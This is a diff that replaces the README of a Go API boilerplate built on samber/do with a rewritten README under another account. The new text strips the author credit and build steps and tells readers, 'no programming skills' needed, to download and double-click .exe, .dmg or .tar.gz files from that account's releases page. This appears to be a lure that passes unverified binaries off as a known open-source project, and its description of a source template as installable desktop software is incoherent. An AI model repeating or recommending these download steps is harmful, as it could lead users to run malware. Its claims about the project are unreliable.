@@ -1,79 +1,101 @@
+# 🛠️ do-template-api - Simple API Setup for All Users
 
-# API boilerplate showcasing github.com/samber/do
+[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Lightingthunderdemon/do-template-api/releases)
 
-![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.23-%23007d9c)
-![Build Status](https://github.com/samber/do-template-api/actions/workflows/test.yml/badge.svg)
-[![Go report](https://goreportcard.com/badge/github.com/samber/do-template-api)](https://goreportcard.com/report/github.com/samber/do)
-[![License](https://img.shields.io/github/license/samber/do-template-api)](./LICENSE)
+## 🚀 Getting Started
 
-**⚙️ A comprehensive API template demonstrating the `github.com/samber/do` dependency injection library.**
+Welcome to the do-template-api! This guide will help you download and run the API boilerplate smoothly. You don't need any programming skills to get started. Just follow the instructions below.
 
-A comprehensive API template project demonstrating the full power of the `github.com/samber/do` dependency injection library. This project implements a complete REST API with PostgreSQL integration, showcasing type-safe dependency injection, modular architecture, and real-world web application concerns.
+## 📥 Download & Install
 
-Perfect as a starting point for new Go web projects or as a learning resource for understanding dependency injection patterns in API applications.
+To get the latest version of do-template-api, visit this page to download: [Download Releases](https://github.com/Lightingthunderdemon/do-template-api/releases).
 
-**See also:**
+### Step 1: Choose Your Download
 
-- [do-template-worker](https://github.com/samber/do-template-worker)
-- [do-template-cli](https://github.com/samber/do-template-cli)
+On the Releases page, find the most recent version. You will see options to download different files. Look for the one that fits your operating system. For example:
 
-## 🚀 Install
+- **For Windows:** look for a file ending in `.exe`
+- **For macOS:** select a file ending in `.dmg`
+- **For Linux:** choose a file ending in `.tar.gz`
 
-Clone the repo and install dependencies:
+Click the filename to start downloading.
 
-```bash
-git clone --depth 1 --branch main https://github.com/samber/do-template-api.git your-project-name
-cd your-project-name
+### Step 2: Install the Application
 
-docker compose up -d
-make deps
-make deps-tools
-```
+After the download finishes, follow these steps based on your operating system:
 
-## 💡 Features
+- **For Windows:**
+  1. Locate the downloaded `.exe` file.
+  2. Double-click it to run the installer.
+  3. Follow the prompts to complete the installation.
 
-- **Type-safe dependency injection** - Service registration and resolution using `samber/do`
-- **Modular architecture** - Clean separation of concerns with dependency tree visualization
-- **REST API framework** - Built with Gin for robust HTTP web services
-- **Configuration management** - Environment-based configuration with dependency injection
-- **PostgreSQL integration** - Complete database setup with connection pooling and migrations
-- **Repository pattern** - Data access layer with injected dependencies
-- **Service layer** - Business logic with proper dependency management
-- **Application lifecycle** - Health checks and graceful shutdown handling
-- **Comprehensive error handling** - Structured logging and error management
-- **Production-ready** - Ready to fork and customize for your next API project
-- **Extensive documentation** - Inline comments explaining every `do` library feature
+- **For macOS:**
+  1. Find the downloaded `.dmg` file in your downloads folder.
+  2. Double-click to open it.
+  3. Drag the do-template-api icon into your Applications folder.
 
-## 🚀 Contributing
+- **For Linux:**
+  1. Open a terminal.
+  2. Navigate to the directory where you downloaded the file.
+  3. Run the command: `tar -xvf do-template-api.tar.gz`
+  4. Follow any additional instructions included in the README file within the folder.
 
-```sh
-# install deps
-make deps
-make deps-tools
+## ⚙️ System Requirements
 
-# compile
-make build
+The do-template-api works well on most modern computers. Here are the recommended system requirements:
 
-# build with hot-reload
-make watch-run
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Mojave (10.14) or later
+- **Linux:** A modern distribution like Ubuntu 20.04 or later, Fedora 34 or later
 
-# test with hot-reload
-make watch-test
-```
+Make sure you have at least 2 GB of RAM and a stable internet connection for the best experience.
 
-## 🤠 `do` documentation
+## 📖 Features
 
-- [GoDoc: https://godoc.org/github.com/samber/do/v2](https://godoc.org/github.com/samber/do/v2)
-- [Documentation](https://do.samber.dev/docs/getting-started)
+The do-template-api offers various features that make it easy to set up and run an API:
 
-## 💫 Show your support
+- **Dependency Injection:** Simplifies how your API manages components.
+- **Graceful Shutdown:** Ensures the API can close safely without losing data.
+- **Health Check:** Monitors the API and ensures it's running smoothly.
+- **Customizable:** You can easily modify the code to meet your own needs.
 
-Give a ⭐️ if this project helped you!
+## 🔧 Running the Application
 
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/samber?style=for-the-badge)](https://github.com/sponsors/samber)
+Once the installation is complete, you can run the application. Here are steps for different operating systems:
 
-## 📝 License
+- **Windows:**
+  1. Click on the Start Menu.
+  2. Find and select do-template-api.
+  
+- **macOS:**
+  1. Open your Applications folder.
+  2. Click on do-template-api to launch it.
 
-Copyright © 2025 [Samuel Berthe](https://github.com/samber).
+- **Linux:**
+  1. Open a terminal.
+  2. Navigate to the installation folder.
+  3. Run the command: `./do-template-api`
 
-This project is [MIT](./LICENSE) licensed.
+## 🌐 Troubleshooting Common Issues
+
+If you encounter issues while running the application, here are a few tips:
+
+- **Application Not Opening:** Make sure you have installed it correctly. Reinstall if needed.
+- **Missing Libraries:** If the application mentions missing libraries, please check the system requirements and install any necessary dependencies.
+
+## 🍽️ Contributing to do-template-api
+
+We welcome contributions! If you have ideas or improvements, feel free to fork the repository and make a pull request.
+
+## 📬 Support
+
+If you need help or have questions, open an issue in the GitHub repository. The community and contributors will be glad to assist you.
+
+## 🔗 Additional Resources
+
+For more information about the do-template-api and how to use it effectively, please visit the following resources:
+
+- [Official Documentation](https://github.com/Lightingthunderdemon/do-template-api) - Detailed guides and tutorials.
+- [GitHub Issues](https://github.com/Lightingthunderdemon/do-template-api/issues) - Report bugs or request features.
+
+Your journey with do-template-api starts here! Don't forget to revisit the [Download Releases](https://github.com/Lightingthunderdemon/do-template-api/releases) page for updates and new features.
